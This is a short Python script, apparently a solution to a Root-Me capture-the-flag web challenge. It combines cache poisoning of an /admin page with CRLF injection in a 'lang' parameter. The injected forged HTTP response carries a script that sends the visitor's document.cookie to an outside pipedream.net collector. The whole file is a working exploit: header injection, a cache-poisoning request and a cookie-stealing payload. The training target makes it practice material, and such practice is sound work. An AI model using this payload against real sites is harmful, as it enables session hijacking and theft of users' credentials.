#!/usr/bin/python
 
 
import requests
 
 
efface_cache = {'Host':'challenge01.root-me.org:58002','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36','Cache-Control':'no-cache','Cookie':'spip_session=da321d10-d3a9-4814-8377-7af787fe9d34'}
 
 
normal_headers = {'Host':'challenge01.root-me.org:58002','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36','Cookie':'da321d10-d3a9-4814-8377-7af787fe9d34'}
 
 
params = "fr%0d%0aContent-Length%3a+0%0d%0a%0d%0aHTTP%2f1.1+200+OK%0d%0aContent-Type%3a+text%2fhtml%0d%0aLast-Modified%3a+Sat%2c+06+Jun+2023+12%3a00%3a00+GMT%0d%0aContent-Length%3a+100%0d%0a%0d%0a%3cscript%3edocument.location%3d%22https%3A%2F%2Feon5wu9esj2rcgn.m.pipedream.net%3fflag%3d%22%2bdocument.cookie%3c%2fscript%3e"
 
 
cible = "http://challenge02.root-me.org:58002"
connexion1 = cible+"/admin"
connexion2 = cible+"/user/param?lang="+params
 
 
rq1 = requests.get(connexion1,headers=efface_cache)
rq2 = requests.get(connexion2,headers=normal_headers)
rq3 = requests.get(connexion1,headers=normal_headers)
 
 
print("-----------------------------------------------------------")
print(rq1)
print(rq1.text)
print("-----------------------------------------------------------")
print(rq2)
print(rq2.text)
print("-----------------------------------------------------------")
print(rq3)
print(rq3.text)
print("-----------------------------------------------------------")